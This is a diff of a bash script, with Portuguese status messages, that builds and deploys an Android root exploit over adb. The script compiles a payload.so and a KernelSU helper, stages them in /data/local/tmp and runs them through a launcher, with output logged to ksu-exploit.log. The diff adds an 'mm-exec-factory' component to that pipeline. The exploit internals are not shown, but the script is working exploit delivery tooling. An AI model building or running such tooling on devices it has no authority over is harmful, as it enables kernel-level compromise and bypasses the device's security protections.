@@ -9,6 +9,7 @@ REMOTE_PAYLOAD=/data/local/tmp/payload.so
 REMOTE_KSUD=/data/local/tmp/ksud-selected
 REMOTE_KSUD_STAGE=/data/local/tmp/.ksud-stage
 REMOTE_LAUNCHER=/data/local/tmp/stability-launcher
+REMOTE_MM_FACTORY=/data/local/tmp/mm-exec-factory
 REMOTE_ASSETS=/data/local/tmp/simple-root
 
 usage() {
@@ -82,13 +83,14 @@ fi
 printf '[*] Compilando engine AFZH3\n'
 make -C "$ENGINE_DIR" -B -j2 so
 install -m 755 "$ENGINE_DIR/build/payload.so" "$ASSET_DIR/payload.so"
+install -m 755 "$ENGINE_DIR/build/mm-exec-factory" "$ASSET_DIR/mm-exec-factory"
 
 # Build the open-source helper used for both UMH and KernelSU late-load.
 printf '[*] Compilando helper AFZH3 de targets/afzh3/helper/su_daemon.c\n'
 make -B -C "$HELPER_DIR" "ANDROID_NDK_HOME=$NDK_DIR"
 install -m 755 "$HELPER_BINARY" "$ASSET_DIR/ksu-helper"
 
-assets=(ksu-helper payload.so "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
+assets=(ksu-helper payload.so mm-exec-factory "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
 for asset in "${assets[@]}"; do
   [[ -s "$ASSET_DIR/$asset" ]] || {
     printf 'Asset ausente ou vazio: %s\n' "$ASSET_DIR/$asset" >&2
@@ -142,6 +144,7 @@ stage() {
 printf '[*] Preparando payload em %s\n' "$serial"
 stage ksu-helper "$REMOTE_HELPER"
 stage payload.so "$REMOTE_PAYLOAD"
+stage mm-exec-factory "$REMOTE_MM_FACTORY"
 stage stability-launcher "$REMOTE_LAUNCHER"
 "${adb_cmd[@]}" shell rm -f /data/local/tmp/ksu-exploit.log
 
@@ -169,7 +172,7 @@ for var in FUTEX_WAIT_SEC KSNITCH_REPEAT KSNITCH_APPENDED PIPE_DETERMINISTIC RMG
   env_exports+="export $var='$val'
 "
 done
-exploit_script="${env_exports}exec '$REMOTE_LAUNCHER' --payload '$REMOTE_PAYLOAD' --helper '$REMOTE_HELPER' 2>&1"
+exploit_script="${env_exports}exec '$REMOTE_LAUNCHER' --payload '$REMOTE_PAYLOAD' --helper '$REMOTE_HELPER' --mm-factory '$REMOTE_MM_FACTORY' 2>&1"
 
 printf '[*] Executando payload\n'
 exploit_log="$(mktemp)"
